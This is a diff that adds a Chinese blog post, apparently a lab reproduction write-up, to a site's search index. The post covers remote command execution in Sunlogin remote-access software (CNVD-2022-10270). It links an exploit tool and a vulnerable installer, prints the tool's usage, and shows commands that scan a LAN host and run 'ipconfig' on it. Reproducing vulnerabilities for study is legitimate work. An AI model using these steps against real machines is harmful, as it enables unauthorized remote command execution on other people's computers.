@@ -18151,4 +18151,31 @@ iapp.s("sss.sb", document.getElementById("sb").innerHTML);
         <tag>无线传输</tag>
       </tags>
   </entry>
+  <entry>
+    <title>向日葵命令执行漏洞复现（CNVD-2022-10270）</title>
+    <url>/2022/03/16/%E5%90%91%E6%97%A5%E8%91%B5%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><p>向日葵简约版漏洞地址：<a href="https://www.cnvd.org.cn/flaw/show/CNVD-2022-03672">https://www.cnvd.org.cn/flaw/show/CNVD-2022-03672</a></p>
+<p>向日葵个人版for Windows：<a href="https://www.cnvd.org.cn/flaw/show/CNVD-2022-10270">https://www.cnvd.org.cn/flaw/show/CNVD-2022-10270</a></p>
+<h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><blockquote>
+<p>向日葵个人版for Windows &lt;= 11.0.0.33</p>
+</blockquote>
+<blockquote>
+<p>向日葵简约版 &lt;= V1.0.1.43315 (2021.12)</p>
+</blockquote>
+<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>环境我用的是10.3.0.27372版本下载地址：<a href="https://wwi.lanzouy.com/irKi301jjype">https://wwi.lanzouy.com/irKi301jjype</a></p>
+<p>检测与利用工具：<a href="https://github.com/Mr-xn/sunlogin_rce/releases/tag/new">https://github.com/Mr-xn/sunlogin_rce/releases/tag/new</a></p>
+<p>解压赠予执行权限</p>
+<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20220316143203180.png" alt="image-20220316143203180"></p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="工具使用说明"><a href="#工具使用说明" class="headerlink" title="工具使用说明"></a>工具使用说明</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"> zss@zss&gt;&gt;&gt; ./xrkRce</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">╔═╗┬ ┬┌┐┌╦  ┌─┐┌─┐┬┌┐┌   ╦═╗┌─┐┌─┐</span><br><span class="line">╚═╗│ ││││║  │ ││ ┬││││───╠╦╝│  ├┤ </span><br><span class="line">╚═╝└─┘┘└┘╩═╝└─┘└─┘┴┘└┘   ╩╚═└─┘└─┘</span><br><span class="line"></span><br><span class="line">                                                by:T00ls.net</span><br><span class="line">                                                向日葵Rce</span><br><span class="line">----------------------------------------------</span><br><span class="line"></span><br><span class="line">Usage of ./xrkRce:</span><br><span class="line">  -c string   //要执行的命令</span><br><span class="line">        cmd </span><br><span class="line">  -h string   //目标ip</span><br><span class="line">        ip</span><br><span class="line">  -p string	   //指定扫描端口默认40000-65535</span><br><span class="line">        port:40000-65535 (default <span class="string">&quot;40000-65535&quot;</span>)</span><br><span class="line">  -t string		//执行模式默认扫描模式(scan)  代码执行模式(rce)</span><br><span class="line">        <span class="built_in">type</span> (default <span class="string">&quot;scan&quot;</span>)</span><br><span class="line">  -x int 	//指定线程默认1000</span><br><span class="line">        x (default 1000)</span><br></pre></td></tr></table></figure>
+<h2 id="目标扫描"><a href="#目标扫描" class="headerlink" title="目标扫描"></a>目标扫描</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./xrkRce -h  192.168.0.107  -t scan</span><br></pre></td></tr></table></figure>
+<h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./xrkRce -h  192.168.0.107  -t rce -p 49180 -c <span class="string">&quot;ipconfig&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Zhao-sai-sai/Picture/image-20220316144524778.png" alt="image-20220316144524778"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
 </search>
